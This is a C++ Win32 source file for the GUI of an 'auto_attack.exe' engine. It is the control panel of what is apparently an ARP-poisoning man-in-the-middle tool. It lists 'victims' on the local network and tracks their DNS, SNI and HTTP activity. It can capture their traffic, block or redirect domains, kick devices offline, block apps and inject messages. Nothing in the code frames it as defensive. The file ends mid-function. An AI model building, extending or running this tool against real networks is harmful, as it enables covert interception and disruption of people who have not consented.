// ============================================================
//  gui_main.cpp — Win32 GUI for auto_attack.exe
// ============================================================

#define WIN32_LEAN_AND_MEAN
#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif
#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <commctrl.h>
#include <commdlg.h>
#include <iphlpapi.h>
#include <ipifcons.h>
#include <uxtheme.h>
#include <shellapi.h>
#include <string>
#include <vector>
#include <mutex>
#include <thread>
#include <atomic>
#include <sstream>
#include <algorithm>
#include <cctype>
#include <cstdio>
#include <cstdlib>
#include <cstring>

#ifndef IF_TYPE_IEEE80211
#define IF_TYPE_IEEE80211 71
#endif

#define COL_BG       RGB(18, 18, 24)
#define COL_PANEL    RGB(28, 28, 36)
#define COL_INPUT    RGB(14, 14, 20)
#define COL_TEXT     RGB(232, 232, 240)
#define COL_DIM      RGB(120, 120, 135)
#define COL_ACCENT   RGB(90, 170, 255)
#define COL_GREEN    RGB(80, 200, 120)
#define COL_ORANGE   RGB(255, 170, 60)
#define COL_RED      RGB(255, 90, 90)

struct Victim   { std::string ip, mac, name; bool sel = false;
                  std::string ports, os, banner; };
struct Activity { std::string ip, name; long dns = 0, sni = 0, http = 0; unsigned long age = 0;
                  unsigned long long capBytes = 0, events = 0; bool capFull = false; };
struct Rule     { std::string pattern, action, target, victim; };
struct AppEntry { std::string victim, app; int blocked = 0; };

struct Status {
    int mode = 0;
    bool attack = false, fwd = false, portal = false;
    long seen = 0, arp = 0, dns = 0, kills = 0, sent = 0, rep = 0, gwm = 0;
    int tracked = 0, rules = 0, victims = 0, selected = 0;
    bool scanning = false;
    bool cap = false;
    std::string myip, gw, ifname, focus;
} g_status;

std::mutex   g_stateMutex;
std::vector<Victim>   g_victims;
std::vector<Activity> g_activity;
std::vector<Rule>     g_rules;
std::vector<AppEntry> g_apps;
bool g_updatingVictimsLV = false;

// _dump arrives line by line; stage the frame and only swap it in on END so
// the list views never flicker and a half-read frame can't be displayed.
std::vector<Victim>   g_stageVictims;
std::vector<Activity> g_stageActivity;
std::vector<Rule>     g_stageRules;
std::vector<AppEntry> g_stageApps;
bool g_dumpDirty = false;

HANDLE g_hChildOutR = NULL, g_hChildInW = NULL;
HANDLE g_hChildInR  = NULL, g_hChildOutW = NULL;
HANDLE g_hChildProc = NULL;
std::thread g_reader;
std::atomic<bool> g_readerRun{true};
std::atomic<unsigned> g_engineGen{0};
std::atomic<bool> g_engineStopRequested{false};
int g_adapterIndex = 1;

HINSTANCE g_hInst;
HWND g_hMain;
HWND g_hHeader, g_hAdapterCombo, g_hTab;
HWND g_hAccent;
HWND g_pages[5];
HWND g_hLogEdit, g_hStatusText;
HWND g_hBtnStartHdr, g_hBtnStopHdr, g_hBtnRestoreHdr;
HFONT g_fontUI, g_fontBold, g_fontBig, g_fontMono;
HBRUSH g_bgBrush, g_panelBrush, g_inputBrush, g_accentBrush;
std::vector<std::string> g_adapterNames;
std::vector<std::string> g_adapterGuids;
std::string g_adapterGuid;

HWND g_hTooltip = NULL;
void addTooltip(HWND hwnd, const wchar_t* text) {
    if (!g_hTooltip || !hwnd) return;
    TOOLINFOW ti = {0};
    ti.cbSize = sizeof(ti);
    ti.uFlags = TTF_IDISHWND | TTF_SUBCLASS;
    ti.hwnd = g_hMain;
    ti.uId = (UINT_PTR)hwnd;
    ti.lpszText = (LPWSTR)text;
    SendMessageW(g_hTooltip, TTM_ADDTOOLW, 0, (LPARAM)&ti);
}
HWND g_hActivityLV;
HWND g_hTimelineEdit, g_hTimelineCombo, g_hCapCheck;
HWND g_hVictimLV, g_hModeCombo, g_hFilterEdit;
HWND g_hModeLabel, g_hTipLabel;
HWND g_hEmptyState;
HWND g_hRulesLV;
HWND g_hAppsLV;
HWND g_hMsgEdit, g_hMsgTarget, g_hMsgNote1, g_hMsgNote2;

// detailed per-device timeline (engine emits EVENT lines for the focused IP)
std::vector<std::pair<std::string, std::string>> g_events, g_stageEvents;
std::string g_timelineIp;
std::vector<std::string> g_comboIps;
std::string g_timelineText;
bool g_updatingTimelineCombo = false;
bool g_updatingCapCheck = false;

// per-device traffic analytics (engine emits STATS lines for the focused IP)
std::string g_statsIp, g_statsText;
std::string g_stageStatsIp, g_stageStatsText;

// device-list polish: live filter + click-to-sort (persists across refreshes)
std::string g_filterText;
int  g_victimSortCol   = -1;    // -1 = engine order
bool g_victimSortAsc   = true;
int  g_activitySortCol = -1;
bool g_activitySortAsc = true;

enum {
    ID_TAB = 1000, ID_ADAPTER_COMBO, ID_STATUS_TEXT,
    ID_HDR_START, ID_HDR_STOP, ID_HDR_RESTORE,
    ID_SCAN, ID_QUICK, ID_SELECT_ALL, ID_SELECT_NONE, ID_NAMES, ID_FINGERPRINT,
    ID_MODE_COMBO, ID_START, ID_STOP, ID_RESTORE, ID_FWD,
    ID_VICTIM_LV, ID_FILTER,
    ID_ACTIVITY_LV, ID_REFRESH_ACT, ID_TOP, ID_SHOWTRACK, ID_TRACKS, ID_NAMES2, ID_WATCH, ID_REPORT, ID_BYPASS,
    ID_TIMELINE_COMBO, ID_CAP_CHECK, ID_TIMELINE_SAVE, ID_CAPTURES,
    ID_BLOCK_DOMAIN, ID_BLOCK_VICTIM, ID_BLOCK_BTN,
    ID_REDIR_DOMAIN, ID_REDIR_IP, ID_REDIR_VICTIM, ID_REDIR_BTN,
    ID_UNBLOCK_DOMAIN, ID_UNBLOCK_BTN,
    ID_RULES_LV, ID_REFRESH_RULES, ID_SAVE_RULES, ID_LOAD_RULES,
    ID_KICK, ID_UNKICK,
    ID_MSG_EDIT, ID_MSG_TARGET, ID_MSG_SEND, ID_MSG_STOP,
    ID_APPS_LV, ID_APPS_REFRESH, ID_APPS_BLOCK, ID_APPS_UNBLOCK, ID_APPS_SIGS,
    ID_LOG_EDIT, ID_LOG_CLEAR, ID_LOG_COPY, ID_LOG_SAVE,
    ID_HELP,
    ID_TIMER_DUMP, ID_TIMER_AUTOSCAN, ID_TIMER_REPORT,
    WM_APP_LOGNEW = WM_APP + 1,
    WM_APP_REFRESH = WM_APP + 2,
};

void startChild();
void stopChild();
void sendCmd(const std::string& cmd);
void appendLog(const std::string& s);
void handleDumpLine(const std::string& line);
void flushLogToEdit();
void refreshVictimsLV(HWND);
void refreshActivityLV(HWND);
void refreshRulesLV(HWND);
void refreshAppsLV(HWND);
void updateStatusText();
void populateAdapters();
void buildPages();
std::string promptText(HWND parent, const std::wstring& title, const std::wstring& label);

std::mutex g_logMutex;
std::string g_logBuf;
size_t g_logReadPos = 0;

void appendLog(const std::string& s) {
    std::lock_guard<std::mutex> lk(g_logMutex);
    g_logBuf += s;
    if (g_logBuf.size() > 400000) {
        g_logBuf.erase(0, g_logBuf.size() - 300000);
        if (g_logReadPos > g_logBuf.size()) g_logReadPos = 0;
    }
}

bool isElevated() {
    HANDLE h = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &h)) return false;
    TOKEN_ELEVATION info;
    DWORD sz = sizeof(info);
    bool e = false;
    if (GetTokenInformation(h, TokenElevation, &info, sz, &sz))
        e = info.TokenIsElevated != 0;
    CloseHandle(h);
    return e;
}

// engine sits next to this exe — build an absolute path so the GUI can be
// launched from anywhere
static std::string enginePath() {
    wchar_t wbuf[MAX_PATH] = {0};
    GetModuleFileNameW(NULL, wbuf, MAX_PATH);
    std::wstring w(wbuf);
    size_t slash = w.find_last_of(L"\\/");
    if (slash != std::wstring::npos) w = w.substr(0, slash + 1);
    w += L"auto_attack.exe";
    int len = WideCharToMultiByte(CP_ACP, 0, w.c_str(), -1, NULL, 0, NULL, NULL);
    std::string s(len > 1 ? len - 1 : 0, 0);
    if (len > 1) WideCharToMultiByte(CP_ACP, 0, w.c_str(), -1, &s[0], len, NULL, NULL);
    return s;
}

// ---------------------------------------------------------------
// settings (atk\gui.ini): remember the last adapter between runs
// ---------------------------------------------------------------
static std::string guiDir() {
    wchar_t wbuf[MAX_PATH] = {0};
    GetModuleFileNameW(NULL, wbuf, MAX_PATH);
    std::wstring w(wbuf);
    size_t slash = w.find_last_of(L"\\/");
    if (slash != std::wstring::npos) w = w.substr(0, slash + 1);
    int len = WideCharToMultiByte(CP_ACP, 0, w.c_str(), -1, NULL, 0, NULL, NULL);
    std::string s(len > 1 ? len - 1 : 0, 0);
    if (len > 1) WideCharToMultiByte(CP_ACP, 0, w.c_str(), -1, &s[0], len, NULL, NULL);
    return s;
}

static std::string iniPath() { return guiDir() + "atk\\gui.ini"; }

static std::string loadIniValue(const char* key) {
    std::string out;
    FILE* f = fopen(iniPath().c_str(), "rb");
    if (!f) return out;
    size_t klen = strlen(key);
    char line[512];
    while (fgets(line, sizeof(line), f)) {
        std::string s(line);
        while (!s.empty() && (s.back() == '\r' || s.back() == '\n')) s.pop_back();
        if (s.size() > klen && s.compare(0, klen, key) == 0 && s[klen] == '=') {
            out = s.substr(klen + 1);
            break;
        }
    }
    fclose(f);
    return out;
}

static std::string loadSavedAdapter()     { return loadIniValue("adapter"); }
static std::string loadSavedAdapterGuid() { return loadIniValue("guid"); }

static void saveAdapter(const std::string& desc, const std::string& guid) {
    CreateDirectoryA((guiDir() + "atk").c_str(), NULL);
    FILE* f = fopen(iniPath().c_str(), "wb");
    if (!f) return;
    // the GUID is the stable key: indexes shift when a NIC is added/removed
    // and the description can change with a driver update
    fprintf(f, "adapter=%s\nguid=%s\n", desc.c_str(), guid.c_str());
    fclose(f);
}

// a _dump frame is staged and only swapped in on END, so the list views never
// flicker and a half-read frame can't be displayed. Frames start fresh on the
// first protocol line after the previous END.
bool g_frameOpen = false;

static void beginFrameLocked() {
    if (g_frameOpen) return;
    g_stageVictims.clear();
    g_stageActivity.clear();
    g_stageRules.clear();
    g_stageApps.clear();
    g_stageEvents.clear();
    g_frameOpen = true;
}

static bool sameVictim(const Victim& a, const Victim& b) {
    return a.ip == b.ip && a.mac == b.mac && a.name == b.name && a.sel == b.sel &&
           a.ports == b.ports && a.os == b.os && a.banner == b.banner;
}
static bool sameActivity(const Activity& a, const Activity& b) {
    // age changes every second; don't refresh just for that
    return a.ip == b.ip && a.name == b.name &&
           a.dns == b.dns && a.sni == b.sni && a.http == b.http &&
           a.events == b.events;
}
static bool sameRule(const Rule& a, const Rule& b) {
    return a.pattern == b.pattern && a.action == b.action &&
           a.target == b.target && a.victim == b.victim;
}
static bool sameApp(const AppEntry& a, const AppEntry& b) {
    return a.victim == b.victim && a.app == b.app && a.blocked == b.blocked;
}

template <class T, class Eq>
static bool sameList(const std::vector<T>& a, const std::vector<T>& b, Eq eq) {
    if (a.size() != b.size()) return false;
    for (auto& x : a) {
        bool found = false;
        for (auto& y : b) if (eq(x, y)) { found = true; break; }
        if (!found) return false;
    }
    return true;
}

// called from the reader thread when a frame is complete
static void commitDump() {
    std::lock_guard<std::mutex> lk(g_stateMutex);
    bool dirty =
        !sameList(g_victims,  g_stageVictims,  sameVictim)  ||
        !sameList(g_activity, g_stageActivity, sameActivity) ||
        !sameList(g_rules,    g_stageRules,    sameRule)     ||
        !sameList(g_apps,     g_stageApps,     sameApp)      ||
        g_events != g_stageEvents                             ||
        g_stageStatsText != g_statsText;
    if (dirty) {
        g_victims.swap(g_stageVictims);
        g_activity.swap(g_stageActivity);
        g_rules.swap(g_stageRules);
        g_apps.swap(g_stageApps);
        g_events.swap(g_stageEvents);
        g_statsIp = g_stageStatsIp;
        g_statsText = g_stageStatsText;
    }
    g_stageVictims.clear();
    g_stageActivity.clear();
    g_stageRules.clear();
    g_stageApps.clear();
    g_stageEvents.clear();
    g_stageStatsIp.clear();
    g_stageStatsText.clear();
    g_frameOpen = false;
    g_dumpDirty = dirty;
}

void startChild() {
    stopChild();
    g_engineStopRequested = false;
    unsigned gen = ++g_engineGen;
    {
        std::lock_guard<std::mutex> lk(g_stateMutex);
        g_frameOpen = false;      // a new engine starts a fresh frame
        g_stageVictims.clear();
        g_stageActivity.clear();
        g_stageRules.clear();
        g_stageApps.clear();
        g_stageEvents.clear();
        g_events.clear();
        g_timelineIp.clear();
        g_comboIps.clear();
        g_timelineText.clear();
        g_statsIp.clear();
        g_statsText.clear();
        g_stageStatsIp.clear();
        g_stageStatsText.clear();
    }
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    if (!CreatePipe(&g_hChildOutR, &g_hChildOutW, &sa, 0)) return;
    if (!CreatePipe(&g_hChildInR,  &g_hChildInW,  &sa, 0)) {
        CloseHandle(g_hChildOutR); g_hChildOutR = NULL;
        CloseHandle(g_hChildOutW); g_hChildOutW = NULL;
        return;
    }
    SetHandleInformation(g_hChildOutR, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(g_hChildInW,  HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si = {sizeof(si)};
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput  = g_hChildInR;
    si.hStdOutput = g_hChildOutW;
    si.hStdError  = g_hChildOutW;

    PROCESS_INFORMATION pi = {0};
    std::string exeA = enginePath();
    int wlen = MultiByteToWideChar(CP_ACP, 0, exeA.c_str(), -1, NULL, 0);
    std::wstring cmd;
    std::wstring wexe2;
    if (wlen > 0) {
        std::wstring wexe((size_t)wlen, 0);
        MultiByteToWideChar(CP_ACP, 0, exeA.c_str(), -1, &wexe[0], wlen);
        while (!wexe.empty() && wexe.back() == L'\0') wexe.pop_back();
        wchar_t idx[32];
        swprintf_s(idx, L" --adapter=%d", g_adapterIndex);
        cmd = L"\"" + wexe + L"\"" + idx;
        // prefer the stable GUID: adapter indexes shift when a NIC appears or
        // disappears (VPN, VirtualBox, USB wifi, ...)
        if (!g_adapterGuid.empty()) {
            int gl = MultiByteToWideChar(CP_ACP, 0, g_adapterGuid.c_str(), -1, NULL, 0);
            std::wstring gw(gl > 0 ? gl : 1, 0);
            if (gl > 1) MultiByteToWideChar(CP_ACP, 0, g_adapterGuid.c_str(), -1, &gw[0], gl);
            while (!gw.empty() && gw.back() == L'\0') gw.pop_back();
            cmd += L" --adapter-guid=" + gw;
        }
        wexe2 = wexe;
    }

    // engine writes atk\ relative to CWD — pin it to this exe's folder
    std::wstring workDir;
    {
        size_t slash = wexe2.find_last_of(L"\\/");
        if (slash != std::wstring::npos) workDir = wexe2.substr(0, slash);
    }

    BOOL ok = CreateProcessW(NULL, &cmd[0], NULL, NULL, TRUE,
                             CREATE_NO_WINDOW, NULL,
                             workDir.empty() ? NULL : workDir.c_str(),
                             &si, &pi);
    CloseHandle(g_hChildInR); g_hChildInR = NULL;
    CloseHandle(g_hChildOutW); g_hChildOutW = NULL;

    if (!ok) {
        appendLog("[!] failed to launch auto_attack.exe\r\n");
        PostMessage(g_hMain, WM_APP_LOGNEW, 0, 0);
        if (g_hChildOutR) { CloseHandle(g_hChildOutR); g_hChildOutR = NULL; }
        if (g_hChildInW)  { CloseHandle(g_hChildInW);  g_hChildInW  = NULL; }
        MessageBoxW(g_hMain,
            L"Could not start auto_attack.exe.\n\n"
            L"Check that:\n"
            L"- auto_attack.exe is in the SAME folder as this GUI\n"
            L"- you approved the UAC prompt\n"
            L"- the Npcap runtime is installed (wpcap.dll)",
            L"auto_attack - engine failed to start",
            MB_OK | MB_ICONERROR);
        return;
    }
    CloseHandle(pi.hThread);
    g_hChildProc = pi.hProcess;

    g_readerRun = true;
    g_reader = std::thread([gen]() {
        char buf[4096];
        DWORD n = 0;
        std::string accum;
        while (g_readerRun) {
            if (!ReadFile(g_hChildOutR, buf, sizeof(buf) - 1, &n, NULL)) break;
            if (n == 0) break;
            buf[n] = 0;
            accum.append(buf);
            size_t pos;
            while ((pos = accum.find('\n')) != std::string::npos) {
                std::string line = accum.substr(0, pos);
                accum.erase(0, pos + 1);
                if (!line.empty() && line.back() == '\r') line.pop_back();
                handleDumpLine(line);
                // the _dump protocol is for the list views, not the log
                bool proto = line.rfind("VICTIM ", 0) == 0 ||
                             line.rfind("STATUS ", 0) == 0 ||
                             line.rfind("RULE ", 0) == 0 ||
                             line.rfind("ACTIVITY ", 0) == 0 ||
                             line.rfind("APP ", 0) == 0 ||
                             line == "END";
                if (!line.empty() && !proto) appendLog(line + "\r\n");
                if (line == "END") PostMessage(g_hMain, WM_APP_REFRESH, 0, 0);
            }
            PostMessage(g_hMain, WM_APP_LOGNEW, 0, 0);
        }
        appendLog(g_engineStopRequested ? "[*] engine stopped\r\n"
                                        : "[!] engine exited unexpectedly\r\n");
        PostMessage(g_hMain, WM_APP_LOGNEW, 0, 0);
        PostMessage(g_hMain, WM_APP + 3, (WPARAM)gen, 0);
    });
    Sleep(400);
    // keep the engine's mode in sync with the combo: the engine defaults to
    // Intercept, but the user may have picked something else before a restart
    if (g_hModeCombo) {
        int sel = (int)SendMessageW(g_hModeCombo, CB_GETCURSEL, 0, 0);
        int m = (sel >= 0 && sel <= 5) ? sel + 1 : 1;
        char mbuf[32];
        snprintf(mbuf, sizeof(mbuf), "m %d", m);
        sendCmd(mbuf);
    }
    appendLog("[+] engine started\r\n");
    PostMessage(g_hMain, WM_APP_LOGNEW, 0, 0);
}

void stopChild() {
    g_engineStopRequested = true;
    ++g_engineGen;          // invalidate the old reader's exit notification
    g_readerRun = false;

    // ask for a clean stop: "x" repairs ARP first, "q" then exits. A scan can
    // take several seconds, so the engine needs more than a token wait - a
    // forced kill mid-attack would leave the LAN poisoned until ARP expires.
    if (g_hChildInW) {
        const char* q = "x\nq\n";
        DWORD w = 0;
        WriteFile(g_hChildInW, q, 4, &w, NULL);
    }
    if (g_hChildProc) {
        DWORD r = WaitForSingleObject(g_hChildProc, 10000);
        if (r == WAIT_TIMEOUT) {
            appendLog("[!] engine did not stop in time - forcing it "
                      "(use RESTORE ARP if the network is still down)\r\n");
            PostMessage(g_hMain, WM_APP_LOGNEW, 0, 0);
            TerminateProcess(g_hChildProc, 0);
            WaitForSingleObject(g_hChildProc, 1000);
        }
    }
    if (g_reader.joinable()) g_reader.join();
    if (g_hChildOutR) { CloseHandle(g_hChildOutR); g_hChildOutR = NULL; }
    if (g_hChildProc) { CloseHandle(g_hChildProc); g_hChildProc = NULL; }
    if (g_hChildInW)  { CloseHandle(g_hChildInW);  g_hChildInW  = NULL; }
}

void sendCmd(const std::string& cmd) {
    if (!g_hChildInW) { appendLog("[!] engine not running\r\n"); return; }
    std::string s = cmd + "\n";
    DWORD written = 0;
    if (!WriteFile(g_hChildInW, s.data(), (DWORD)s.size(), &written, NULL)) {
        static bool warned = false;
        if (!warned) {
            warned = true;
            appendLog("[!] engine pipe closed - restart the app\r\n");
            PostMessage(g_hMain, WM_APP_LOGNEW, 0, 0);
        }
    }
}

std::vector<std::string> splitPipe(const std::string& s) {
    std::vector<std::string> out;
    std::string cur;
    for (char c : s) {
        if (c == '|') { out.push_back(cur); cur.clear(); }
        else cur += c;
    }
    out.push_back(cur);
    return out;
}

static std::string fmtBytes(unsigned long long n) {
    char b[64];
    if (n < 1024ULL) snprintf(b, sizeof(b), "%llu B", n);
    else if (n < 1024ULL * 1024) snprintf(b, sizeof(b), "%.1f KB", n / 1024.0);
    else if (n < 1024ULL * 1024 * 1024) snprintf(b, sizeof(b), "%.1f MB", n / (1024.0 * 1024));
    else snprintf(b, sizeof(b), "%.2f GB", n / (1024.0 * 1024 * 1024));
    return b;
}

// turn a STATS line's fields into a short, human-readable header
static std::string buildStatsText(unsigned long long up, unsigned long long down,
                                  unsigned long long pu, unsigned long long pd,
                                  const std::string& protos, const std::string& peers,
                                  const std::string& bypass) {
    std::string t;
    t += "up " + fmtBytes(up) + " / " + std::to_string(pu) + " pkts    ";
    t += "down " + fmtBytes(down) + " / " + std::to_string(pd) + " pkts";
    if (!protos.empty()) {
        t += "\r\n";
        bool first = true; int n = 0;
        std::stringstream ss(protos); std::string tok;
        while (std::getline(ss, tok, ',') && n < 8) {
            size_t c = tok.rfind(':');
            if (c == std::string::npos) continue;
            if (!first) t += "   ";
            first = false;
            t += tok.substr(0, c) + " " + tok.substr(c + 1);
            n++;
        }
    }
    if (!peers.empty()) {
        t += "\r\n";
        bool first = true; int n = 0;
        std::stringstream ss(peers); std::string tok;
        while (std::getline(ss, tok, ',') && n < 6) {
            size_t c = tok.rfind(':');
            if (c == std::string::npos) continue;
            if (!first) t += "   ";
            first = false;
            t += tok.substr(0, c) + " (" + tok.substr(c + 1) + ")";
            n++;
        }
    }
    if (!bypass.empty()) {
        t += "\r\n";
        t += "bypass: " + bypass;
    }
    return t;
}

void handleDumpLine(const std::string& line) {
    if (line.rfind("VICTIM ", 0) == 0) {
        auto p = splitPipe(line.substr(7));
        if (p.size() < 4) return;
        std::lock_guard<std::mutex> lk(g_stateMutex);
        beginFrameLocked();
        for (auto& v : g_stageVictims) if (v.ip == p[0]) {
            v.mac = p[1]; v.name = p[2];
            v.sel = atoi(p[3].c_str()) != 0;
            if (p.size() > 4) v.ports  = p[4];
            if (p.size() > 5) v.os     = p[5];
            if (p.size() > 6) v.banner = p[6];
            return;
        }
        Victim v; v.ip = p[0]; v.mac = p[1]; v.name = p[2];
        v.sel = atoi(p[3].c_str()) != 0;
        if (p.size() > 4) v.ports  = p[4];
        if (p.size() > 5) v.os     = p[5];
        if (p.size() > 6) v.banner = p[6];
        g_stageVictims.push_back(v);
    } else if (line.rfind("STATUS ", 0) == 0) {
        std::string s = line.substr(7);
        std::stringstream ss(s);
        std::string tok;
        std::lock_guard<std::mutex> lk(g_stateMutex);
        beginFrameLocked();
        while (ss >> tok) {
            size_t eq = tok.find('=');
            if (eq == std::string::npos) continue;
            std::string k = tok.substr(0, eq);
            std::string v = tok.substr(eq + 1);
            if (k == "mode") g_status.mode = atoi(v.c_str());
            else if (k == "attack") g_status.attack = atoi(v.c_str()) != 0;
            else if (k == "fwd") g_status.fwd = atoi(v.c_str()) != 0;
            else if (k == "portal") g_status.portal = atoi(v.c_str()) != 0;
            else if (k == "seen") g_status.seen = atol(v.c_str());
            else if (k == "arp") g_status.arp = atol(v.c_str());
            else if (k == "dns") g_status.dns = atol(v.c_str());
            else if (k == "kills") g_status.kills = atol(v.c_str());
            else if (k == "sent") g_status.sent = atol(v.c_str());
            else if (k == "rep") g_status.rep = atol(v.c_str());
            else if (k == "gwm") g_status.gwm = atol(v.c_str());
            else if (k == "tracked") g_status.tracked = atoi(v.c_str());
            else if (k == "rules") g_status.rules = atoi(v.c_str());
            else if (k == "victims") g_status.victims = atoi(v.c_str());
            else if (k == "selected") g_status.selected = atoi(v.c_str());
            else if (k == "scanning") g_status.scanning = atoi(v.c_str()) != 0;
            else if (k == "cap") g_status.cap = atoi(v.c_str()) != 0;
            else if (k == "focus") { g_status.focus = v; if (v == "-") g_status.focus.clear(); }
            else if (k == "myip") g_status.myip = v;
            else if (k == "gw") g_status.gw = v;
            else if (k == "ifname") {
                g_status.ifname = v;
                for (auto& ch : g_status.ifname) if (ch == '_') ch = ' ';
            }
        }
    } else if (line.rfind("RULE ", 0) == 0) {
        auto p = splitPipe(line.substr(5));
        if (p.size() < 4) return;
        std::lock_guard<std::mutex> lk(g_stateMutex);
        beginFrameLocked();
        for (auto& x : g_stageRules)
            if (x.pattern == p[0] && x.action == p[1] && x.victim == p[3]) return;
        Rule r; r.pattern = p[0]; r.action = p[1];
        r.target = p[2]; r.victim = p[3];
        g_stageRules.push_back(r);
    } else if (line.rfind("ACTIVITY ", 0) == 0) {
        auto p = splitPipe(line.substr(9));
        if (p.size() < 6) return;
        std::lock_guard<std::mutex> lk(g_stateMutex);
        beginFrameLocked();
        Activity a; a.ip = p[0]; a.name = p[1];
        a.dns = atol(p[2].c_str()); a.sni = atol(p[3].c_str());
        a.http = atol(p[4].c_str()); a.age = (unsigned long)atol(p[5].c_str());
        if (p.size() > 6) a.capBytes = _strtoui64(p[6].c_str(), NULL, 10);
        if (p.size() > 7) a.capFull = atoi(p[7].c_str()) != 0;
        if (p.size() > 8) a.events = _strtoui64(p[8].c_str(), NULL, 10);
        for (auto& x : g_stageActivity) if (x.ip == a.ip) { x = a; return; }
        g_stageActivity.push_back(a);
    } else if (line.rfind("STATS ", 0) == 0) {
        auto p = splitPipe(line.substr(6));
        if (p.size() < 6) return;
        auto val = [](const std::string& s) {
            size_t eq = s.find('=');
            return eq == std::string::npos ? std::string() : s.substr(eq + 1);
        };
        unsigned long long up = _strtoui64(val(p[1]).c_str(), NULL, 10);
        unsigned long long down = _strtoui64(val(p[2]).c_str(), NULL, 10);
        unsigned long long pu = _strtoui64(val(p[3]).c_str(), NULL, 10);
        unsigned long long pd = _strtoui64(val(p[4]).c_str(), NULL, 10);
        std::string protos = val(p[5]);
        std::string peers = p.size() > 6 ? val(p[6]) : "";
        std::string bypass = p.size() > 7 ? val(p[7]) : "";
        std::lock_guard<std::mutex> lk(g_stateMutex);
        beginFrameLocked();
        g_stageStatsIp = p[0];
        g_stageStatsText = buildStatsText(up, down, pu, pd, protos, peers, bypass);
    } else if (line.rfind("EVENT ", 0) == 0) {
        std::string rest = line.substr(6);
        size_t bar = rest.find('|');
        if (bar == std::string::npos) return;
        std::lock_guard<std::mutex> lk(g_stateMutex);
        beginFrameLocked();
        g_stageEvents.push_back(std::make_pair(rest.substr(0, bar), rest.substr(bar + 1)));
    } else if (line.rfind("APP ", 0) == 0) {
        auto p = splitPipe(line.substr(4));
        if (p.size() < 3) return;
        std::lock_guard<std::mutex> lk(g_stateMutex);
        beginFrameLocked();
        AppEntry e; e.victim = p[0]; e.app = p[1];
        e.blocked = atoi(p[2].c_str());
        for (auto& x : g_stageApps)
            if (x.victim == e.victim && x.app == e.app) { x = e; return; }
        g_stageApps.push_back(e);
    } else if (line == "END") {
        commitDump();
    }
}

// ---------------------------------------------------------------
// prompt dialog
// ---------------------------------------------------------------
static std::string g_promptResult;
static std::wstring g_promptLabel;
static HBRUSH     g_promptBg;

LRESULT CALLBACK PromptProc(HWND hWnd, UINT msg, WPARAM wp, LPARAM lp) {
    static HWND hEdit, hOK, hCancel;
    switch (msg) {
        case WM_CREATE: {
            g_promptBg = CreateSolidBrush(COL_PANEL);
            HWND lbl = CreateWindowW(L"STATIC", g_promptLabel.c_str(),
                WS_CHILD | WS_VISIBLE | SS_LEFT,
                20, 16, 380, 40, hWnd, NULL, g_hInst, NULL);
            SendMessage(lbl, WM_SETFONT, (WPARAM)g_fontUI, TRUE);
            hEdit = CreateWindowExW(0, L"EDIT", L"",
                WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL,
                20, 60, 380, 26, hWnd, (HMENU)100, g_hInst, NULL);
            SendMessage(hEdit, WM_SETFONT, (WPARAM)g_fontUI, TRUE);
            hOK = CreateWindowW(L"BUTTON", L"OK",
                WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON,
                240, 100, 80, 28, hWnd, (HMENU)IDOK, g_hInst, NULL);
            SendMessage(hOK, WM_SETFONT, (WPARAM)g_fontUI, TRUE);
            hCancel = CreateWindowW(L"BUTTON", L"Cancel",
                WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
                325, 100, 80, 28, hWnd, (HMENU)IDCANCEL, g_hInst, NULL);
            SendMessage(hCancel, WM_SETFONT, (WPARAM)g_fontUI, TRUE);
            SetFocus(hEdit);
            return 0;
        }
        case WM_COMMAND:
            if (LOWORD(wp) == IDOK) {
                wchar_t buf[1024] = {0};
                GetWindowTextW(hEdit, buf, 1024);
                int len = WideCharToMultiByte(CP_UTF8, 0, buf, -1, NULL, 0, NULL, NULL);
                std::string s(len > 1 ? len - 1 : 0, 0);
                if (len > 1) WideCharToMultiByte(CP_UTF8, 0, buf, -1, &s[0], len, NULL, NULL);
                g_promptResult = s;
                DestroyWindow(hWnd);
            } else if (LOWORD(wp) == IDCANCEL) {
                DestroyWindow(hWnd);
            }
            return 0;
        case WM_CTLCOLORSTATIC: {
            HDC dc = (HDC)wp;
            SetTextColor(dc, COL_TEXT);
            SetBkColor(dc, COL_PANEL);
            return (LRESULT)g_promptBg;
        }
        case WM_CTLCOLOREDIT: {
            HDC dc = (HDC)wp;
            SetTextColor(dc, COL_TEXT);
            SetBkColor(dc, COL_INPUT);
            return (LRESULT)g_promptBg;
        }
        case WM_QUERYENDSESSION:
            // Windows is shutting down: ask the engine to repair ARP and
            // forwarding immediately. We may not get time for a full stop.
            if (g_hChildInW) {
                DWORD w = 0;
                const char* c = "x\nq\n";
                WriteFile(g_hChildInW, c, 4, &w, NULL);
            }
            return TRUE;

        case WM_CLOSE:
            DestroyWindow(hWnd);
            return 0;
    }
    return DefWindowProcW(hWnd, msg, wp, lp);
}

std::string promptText(HWND parent, const std::wstring& title,
                       const std::wstring& label) {
    g_promptResult.clear();
    g_promptLabel = label;

    static bool reg = false;
    if (!reg) {
        WNDCLASSEXW wcex = {sizeof(wcex)};
        wcex.lpfnWndProc = PromptProc;
        wcex.hInstance = g_hInst;
        wcex.hbrBackground = CreateSolidBrush(COL_PANEL);
        wcex.lpszClassName = L"AA_Prompt";
        wcex.hCursor = LoadCursor(NULL, IDC_ARROW);
        RegisterClassExW(&wcex);
        reg = true;
    }

    HWND hDlg = CreateWindowExW(WS_EX_DLGMODALFRAME | WS_EX_CONTROLPARENT,
        L"AA_Prompt", title.c_str(),
        WS_POPUP | WS_CAPTION | WS_SYSMENU,
        0, 0, 420, 175, parent, NULL, g_hInst, NULL);
    if (!hDlg) return "";

    RECT pr, dr;
    GetWindowRect(parent, &pr);
    GetWindowRect(hDlg, &dr);
    int w = dr.right - dr.left, h = dr.bottom - dr.top;
    int cx = pr.left + ((pr.right - pr.left) - w) / 2;
    int cy = pr.top + ((pr.bottom - pr.top) - h) / 2;
    SetWindowPos(hDlg, NULL, cx, cy, 0, 0, SWP_NOSIZE | SWP_NOZORDER);

